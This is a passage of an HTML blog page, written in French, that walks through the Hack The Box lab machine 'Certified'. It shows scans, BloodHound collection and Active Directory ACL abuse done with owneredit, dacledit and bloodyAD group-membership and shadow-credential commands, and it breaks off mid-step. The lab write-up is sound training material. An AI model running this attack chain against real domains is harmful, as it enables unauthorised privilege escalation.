@@ -1,0 +1,570 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Certified - z3rodol</title><meta name="Description" content="This is my cool site"><meta property="og:url" content="http://localhost:1313/certified/">
+  <meta property="og:site_name" content="z3rodol">
+  <meta property="og:title" content="Certified">
+  <meta property="og:description" content="Certified est une machine Windows de difficulté moyenne conçue pour un scénario de violation présumé, où les identifiants d’un utilisateur à faibles privilèges sont fournis. Pour accéder au compte management_svc, les listes de contrôle d’accès (ACL) des objets privilégiés sont énumérées, ce qui nous amène à découvrir que judith.mader, qui dispose de l’ACL write owner sur le groupe management, dispose de GenericWrite sur le compte management_svc, ce dernier permettant ainsi l’authentification auprès de la cible via WinRM et l’obtention du flag user. L’exploitation du service de certificats Active Directory (ADCS) est nécessaire pour accéder au compte Administrator en abusant du shadow credentials et de ESC9.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-12-11T13:48:56+00:00">
+    <meta property="article:modified_time" content="2025-12-11T13:48:56+00:00">
+    <meta property="article:tag" content="Medium">
+    <meta property="article:tag" content="Windows">
+    <meta property="article:tag" content="Active Directory">
+    <meta property="article:tag" content="ESC9">
+    <meta property="article:tag" content="ADCS">
+    <meta property="og:image" content="http://localhost:1313/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/logo.png">
+  <meta name="twitter:title" content="Certified">
+  <meta name="twitter:description" content="Certified est une machine Windows de difficulté moyenne conçue pour un scénario de violation présumé, où les identifiants d’un utilisateur à faibles privilèges sont fournis. Pour accéder au compte management_svc, les listes de contrôle d’accès (ACL) des objets privilégiés sont énumérées, ce qui nous amène à découvrir que judith.mader, qui dispose de l’ACL write owner sur le groupe management, dispose de GenericWrite sur le compte management_svc, ce dernier permettant ainsi l’authentification auprès de la cible via WinRM et l’obtention du flag user. L’exploitation du service de certificats Active Directory (ADCS) est nécessaire pour accéder au compte Administrator en abusant du shadow credentials et de ESC9.">
+<meta name="application-name" content="z3rodol">
+<meta name="apple-mobile-web-app-title" content="z3rodol">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/certified/" /><link rel="prev" href="http://localhost:1313/baby/" /><link rel="next" href="http://localhost:1313/down/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Certified",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/certified\/"
+        },"genre": "posts","keywords": "Medium, Windows, Active Directory, ESC9, ADCS","wordcount":  1665 ,
+        "url": "http:\/\/localhost:1313\/certified\/","datePublished": "2025-12-11T13:48:56+00:00","dateModified": "2025-12-11T13:48:56+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "z3rodol"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'auto';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="z3rodol">z3rodol Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="z3rodol">z3rodol Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Certified</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://z3rodol.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle" aria-hidden="true"></i>z3rodol</a></span>&nbsp;<span class="post-category">included in <a href="/categories/machines/"><i class="far fa-folder" aria-hidden="true"></i>Machines</a>&nbsp;<a href="/categories/hackthebox/"><i class="far fa-folder" aria-hidden="true"></i>Hackthebox</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt" aria-hidden="true"></i>&nbsp;<time datetime="2025-12-11">2025-12-11</time>&nbsp;<i class="fas fa-pencil-alt" aria-hidden="true"></i>&nbsp;1665 words&nbsp;
+                <i class="far fa-clock" aria-hidden="true"></i>&nbsp;8 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#énumération">Énumération</a>
+          <ul>
+            <li><a href="#nmap">Nmap</a></li>
+            <li><a href="#smb">SMB</a></li>
+          </ul>
+        </li>
+        <li><a href="#shell-en-tant-management_svc">Shell en tant management_svc</a>
+          <ul>
+            <li><a href="#bloodhound">BloodHound</a></li>
+            <li><a href="#shadow-credentials">Shadow Credentials</a></li>
+          </ul>
+        </li>
+        <li><a href="#shell-en-tant-quadministrator">Shell en tant qu&rsquo;administrator</a>
+          <ul>
+            <li><a href="#genericall-sur-ca_operator">GenericAll sur ca_operator</a></li>
+            <li><a href="#esc9">ESC9</a></li>
+            <li><a href="#winrm">WinRM</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Certified/certified.png"
+        data-srcset="/images/Certified/certified.png, /images/Certified/certified.png 1.5x, /images/Certified/certified.png 2x"
+        data-sizes="auto"
+        alt="/images/Certified/certified.png"
+        title="Certified" width="670" height="320" /></p>
+<p><code>Certified</code> est une machine Windows de difficulté moyenne conçue pour un scénario de violation présumé, où les identifiants d&rsquo;un utilisateur à faibles privilèges sont fournis. Pour accéder au compte <code>management_svc</code>, les listes de contrôle d&rsquo;accès (ACL) des objets privilégiés sont énumérées, ce qui nous amène à découvrir que <code>judith.mader</code>, qui dispose de l&rsquo;ACL <code>write owner</code> sur le groupe <code>management</code>, dispose de <code>GenericWrite</code> sur le compte  <code>management_svc</code>, ce dernier permettant ainsi l&rsquo;authentification auprès de la cible via <code>WinRM</code> et l&rsquo;obtention du flag user. L&rsquo;exploitation du service de certificats Active Directory (ADCS) est nécessaire pour accéder au compte <code>Administrator</code> en abusant du <code>shadow credentials</code> et de <code>ESC9</code>.</p>
+<h2 id="énumération">Énumération</h2>
+<p>Nous démarrons la machine Certified avec les identifiants suivants <code>judith.mader:judith09</code></p>
+<h3 id="nmap">Nmap</h3>
+<p>Le scan révèle plusieurs ports ouverts :</p>
+<ul>
+<li>53 pour le DNS.</li>
+<li>88 pour le Kerberos.</li>
+<li>389 pour le LDAP</li>
+<li>445 pour le SMB.</li>
+<li>636 pour le LDAPS</li>
+<li>5985 pour WinRM</li>
+</ul>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">╰─➤  nmap 10.129.2.225 --min-rate 5000 -p- -sV -sC -Pn -oN nmap.txt
+</span></span><span class="line"><span class="cl">Starting Nmap 7.93 ( https://nmap.org ) at 2025-06-20 22:44 CEST
+</span></span><span class="line"><span class="cl">Nmap scan report for 10.129.2.225
+</span></span><span class="line"><span class="cl">Host is up (0.096s latency).
+</span></span><span class="line"><span class="cl">Not shown: 65517 filtered tcp ports (no-response)
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE       VERSION
+</span></span><span class="line"><span class="cl">53/tcp    open  domain        Simple DNS Plus
+</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-21 03:45:17Z)
+</span></span><span class="line"><span class="cl">135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
+</span></span><span class="line"><span class="cl">| ssl-cert: Subject:
+</span></span><span class="line"><span class="cl">| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
+</span></span><span class="line"><span class="cl">| Not valid before: 2025-06-11T21:05:29
+</span></span><span class="line"><span class="cl">|_Not valid after:  2105-05-23T21:05:29
+</span></span><span class="line"><span class="cl">|_ssl-date: 2025-06-21T03:46:51+00:00; +7h00m01s from scanner time.
+</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds?
+</span></span><span class="line"><span class="cl">464/tcp   open  kpasswd5?
+</span></span><span class="line"><span class="cl">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
+</span></span><span class="line"><span class="cl">|_ssl-date: 2025-06-21T03:46:50+00:00; +7h00m00s from scanner time.
+</span></span><span class="line"><span class="cl">| ssl-cert: Subject:
+</span></span><span class="line"><span class="cl">| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
+</span></span><span class="line"><span class="cl">| Not valid before: 2025-06-11T21:05:29
+</span></span><span class="line"><span class="cl">|_Not valid after:  2105-05-23T21:05:29
+</span></span><span class="line"><span class="cl">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
+</span></span><span class="line"><span class="cl">|_ssl-date: 2025-06-21T03:46:51+00:00; +7h00m01s from scanner time.
+</span></span><span class="line"><span class="cl">| ssl-cert: Subject:
+</span></span><span class="line"><span class="cl">| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
+</span></span><span class="line"><span class="cl">| Not valid before: 2025-06-11T21:05:29
+</span></span><span class="line"><span class="cl">|_Not valid after:  2105-05-23T21:05:29
+</span></span><span class="line"><span class="cl">3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
+</span></span><span class="line"><span class="cl">|_ssl-date: 2025-06-21T03:46:50+00:00; +7h00m00s from scanner time.
+</span></span><span class="line"><span class="cl">| ssl-cert: Subject:
+</span></span><span class="line"><span class="cl">| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
+</span></span><span class="line"><span class="cl">| Not valid before: 2025-06-11T21:05:29
+</span></span><span class="line"><span class="cl">|_Not valid after:  2105-05-23T21:05:29
+</span></span><span class="line"><span class="cl">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span></span><span class="line"><span class="cl">|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl">|_http-title: Not Found
+</span></span><span class="line"><span class="cl">9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span class="line"><span class="cl">49667/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49686/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49698/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49728/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49758/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl">|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
+</span></span><span class="line"><span class="cl">| smb2-security-mode:
+</span></span><span class="line"><span class="cl">|   311:
+</span></span><span class="line"><span class="cl">|_    Message signing enabled and required
+</span></span><span class="line"><span class="cl">| smb2-time:
+</span></span><span class="line"><span class="cl">|   date: 2025-06-21T03:46:14
+</span></span><span class="line"><span class="cl">|_  start_date: N/A</span></span></code></pre></div></div>
+<h3 id="smb">SMB</h3>
+<p>Rien d&rsquo;intéressant en énumérant les partages.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">╰─➤  nxc smb certified.htb -u judith.mader -p judith09 --shares
+</span></span><span class="line"><span class="cl">SMB         10.129.2.225    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
+</span></span><span class="line"><span class="cl">SMB         10.129.2.225    445    DC01             [+] certified.htb\judith.mader:judith09
+</span></span><span class="line"><span class="cl">SMB         10.129.2.225    445    DC01             [*] Enumerated shares
+</span></span><span class="line"><span class="cl">SMB         10.129.2.225    445    DC01             Share           Permissions     Remark
+</span></span><span class="line"><span class="cl">SMB         10.129.2.225    445    DC01             -----           -----------     ------
+</span></span><span class="line"><span class="cl">SMB         10.129.2.225    445    DC01             ADMIN$                          Remote Admin
+</span></span><span class="line"><span class="cl">SMB         10.129.2.225    445    DC01             C$                              Default share
+</span></span><span class="line"><span class="cl">SMB         10.129.2.225    445    DC01             IPC$            READ            Remote IPC
+</span></span><span class="line"><span class="cl">SMB         10.129.2.225    445    DC01             NETLOGON        READ            Logon server share
+</span></span><span class="line"><span class="cl">SMB         10.129.2.225    445    DC01             SYSVOL          READ            Logon server share</span></span></code></pre></div></div>
+<h2 id="shell-en-tant-management_svc">Shell en tant management_svc</h2>
+<h3 id="bloodhound">BloodHound</h3>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">╰─➤</span>  <span class="n">bloodhound</span><span class="o">-</span><span class="n">python</span> <span class="o">-</span><span class="n">u</span> <span class="s1">&#39;judith.mader&#39;</span> <span class="o">-</span><span class="n">p</span> <span class="s1">&#39;judith09&#39;</span> <span class="o">-</span><span class="n">d</span> <span class="n">certified</span><span class="o">.</span><span class="n">htb</span> <span class="o">-</span><span class="n">ns</span> <span class="mf">10.129</span><span class="o">.</span><span class="mf">2.225</span> <span class="o">-</span><span class="n">c</span> <span class="n">All</span> <span class="o">--</span><span class="n">zip</span>                                                   <span class="mi">2</span> <span class="err">↵</span>
+</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">BloodHound</span><span class="o">.</span><span class="n">py</span> <span class="k">for</span> <span class="n">BloodHound</span> <span class="n">LEGACY</span> <span class="p">(</span><span class="n">BloodHound</span> <span class="mf">4.2</span> <span class="ow">and</span> <span class="mf">4.3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="n">AD</span> <span class="n">domain</span><span class="p">:</span> <span class="n">certified</span><span class="o">.</span><span class="n">htb</span>
+</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">Getting</span> <span class="n">TGT</span> <span class="k">for</span> <span class="n">user</span>
+</span></span><span class="line"><span class="cl"><span class="n">WARNING</span><span class="p">:</span> <span class="n">Failed</span> <span class="n">to</span> <span class="n">get</span> <span class="n">Kerberos</span> <span class="n">TGT</span><span class="o">.</span> <span class="n">Falling</span> <span class="n">back</span> <span class="n">to</span> <span class="n">NTLM</span> <span class="n">authentication</span><span class="o">.</span> <span class="n">Error</span><span class="p">:</span> <span class="n">Kerberos</span> <span class="n">SessionError</span><span class="p">:</span> <span class="n">KRB_AP_ERR_SKEW</span><span class="p">(</span><span class="n">Clock</span> <span class="n">skew</span> <span class="n">too</span> <span class="n">great</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">Connecting</span> <span class="n">to</span> <span class="n">LDAP</span> <span class="n">server</span><span class="p">:</span> <span class="n">dc01</span><span class="o">.</span><span class="n">certified</span><span class="o">.</span><span class="n">htb</span>
+</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="mi">1</span> <span class="n">domains</span>
+</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="mi">1</span> <span class="n">domains</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">forest</span>
+</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="mi">1</span> <span class="n">computers</span>
+</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">Connecting</span> <span class="n">to</span> <span class="n">LDAP</span> <span class="n">server</span><span class="p">:</span> <span class="n">dc01</span><span class="o">.</span><span class="n">certified</span><span class="o">.</span><span class="n">htb</span>
+</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="mi">10</span> <span class="n">users</span>
+</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="mi">53</span> <span class="n">groups</span>
+</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="mi">2</span> <span class="n">gpos</span>
+</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="mi">1</span> <span class="n">ous</span>
+</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="mi">19</span> <span class="n">containers</span>
+</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="mi">0</span> <span class="n">trusts</span>
+</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">Starting</span> <span class="n">computer</span> <span class="n">enumeration</span> <span class="n">with</span> <span class="mi">10</span> <span class="n">workers</span>
+</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">Querying</span> <span class="n">computer</span><span class="p">:</span> <span class="n">DC01</span><span class="o">.</span><span class="n">certified</span><span class="o">.</span><span class="n">htb</span>
+</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">Done</span> <span class="ow">in</span> <span class="mi">00</span><span class="n">M</span> <span class="mi">26</span><span class="n">S</span>
+</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">Compressing</span> <span class="n">output</span> <span class="n">into</span> <span class="mi">20250620225141</span><span class="n">_bloodhound</span><span class="o">.</span><span class="n">zip</span></span></span></code></pre></div></div>
+<p><code>judith.mader</code> a le droit <code>WriteOwner</code> sur le groupe <code>management</code>. Les étapes d&rsquo;exploitation sont les suivantes :</p>
+<ol>
+<li>Rendre judith.mader propriétaire du groupe.</li>
+<li>Donner le contrôle total du groupe à judith.mader.</li>
+<li>Ajouter judith.mader au groupe management.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Certified/bloodhound1.png"
+        data-srcset="/images/Certified/bloodhound1.png, /images/Certified/bloodhound1.png 1.5x, /images/Certified/bloodhound1.png 2x"
+        data-sizes="auto"
+        alt="/images/Certified/bloodhound1.png"
+        title="/images/Certified/bloodhound1.png" width="1531" height="487" /></li>
+</ol>
+<p>Je change le propriétaire du groupe management avec le module <code>owneredit</code> de <code>Impacket</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">╰─➤  owneredit.py -action write -new-owner &#34;judith.mader&#34; -target &#34;management&#34; &#34;certified.htb&#34;/&#34;judith.mader&#34;:&#39;judith09&#39;
+</span></span><span class="line"><span class="cl">Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Current owner information below
+</span></span><span class="line"><span class="cl">[*] - SID: S-1-5-21-729746778-2675978091-3820388244-512
+</span></span><span class="line"><span class="cl">[*] - sAMAccountName: Domain Admins
+</span></span><span class="line"><span class="cl">[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=certified,DC=htb
+</span></span><span class="line"><span class="cl">[*] OwnerSid modified successfully!</span></span></code></pre></div></div>
+<p>Ensuite, je donne le contrôle total à judith.mader avec le module <code>dacledit</code> de <code>Impacket</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">╰─➤  dacledit.py -action &#39;write&#39; -rights &#39;FullControl&#39; -principal &#39;judith.mader&#39; -target &#39;management&#39; &#39;certified.htb&#39;/&#39;judith.mader&#39;:&#39;judith09&#39;
+</span></span><span class="line"><span class="cl">Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] DACL backed up to dacledit-20250620-231847.bak
+</span></span><span class="line"><span class="cl">[*] DACL modified successfully!</span></span></code></pre></div></div>
+<p>Ajout de judith.mader dans le groupe management.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">╰─➤  bloodyAD --host &#39;10.129.2.225&#39; -u &#39;judith.mader&#39; -p &#39;judith09&#39; add groupMember &#39;management&#39; &#39;judith.mader&#39;                                       130 ↵ 
+</span></span><span class="line"><span class="cl">[+] judith.mader added to management</span></span></code></pre></div></div>
+<h3 id="shadow-credentials">Shadow Credentials</h3>
+<p>Par la suite, je vois que les membres du groupe management, on le droit <code>GenericWrite</code> sur l&rsquo;utilisateur <code>management_svc</code>. Ceux que judith.mader peut obtenir le hash NTLM de managment_svc.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Certified/bloodhound2.png"
+        data-srcset="/images/Certified/bloodhound2.png, /images/Certified/bloodhound2.png 1.5x, /images/Certified/bloodhound2.png 2x"
+        data-sizes="auto"
+        alt="/images/Certified/bloodhound2.png"
+        title="/images/Certified/bloodhound2.png" width="1133" height="841" /></p>
+<p><code>Shadow Credential</code> sur managment_svc. La commande génère le fichier de certificat avec la clé privée au format de fichier <code>pem</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">╰─➤</span>  <span class="n">bloodyAD</span> <span class="o">--</span><span class="n">host</span> <span class="mf">10.129</span><span class="o">.</span><span class="mf">2.225</span> <span class="o">-</span><span class="n">u</span> <span class="s1">&#39;judith.mader&#39;</span> <span class="o">-</span><span class="n">p</span> <span class="s1">&#39;judith09&#39;</span> <span class="o">-</span><span class="n">d</span> <span class="n">certified</span><span class="o">.</span><span class="n">htb</span> <span class="n">add</span> <span class="s1">&#39;shadowCredentials&#39;</span> <span class="s1">&#39;management_svc&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">KeyCredential</span> <span class="n">generated</span> <span class="n">with</span> <span class="n">following</span> <span class="n">sha256</span> <span class="n">of</span> <span class="n">RSA</span> <span class="n">key</span><span class="p">:</span> <span class="mi">4</span><span class="n">a9e3b4a072d864845b4c601ddaf45cd0580f29b9e2528901186e2a421cdec69</span>
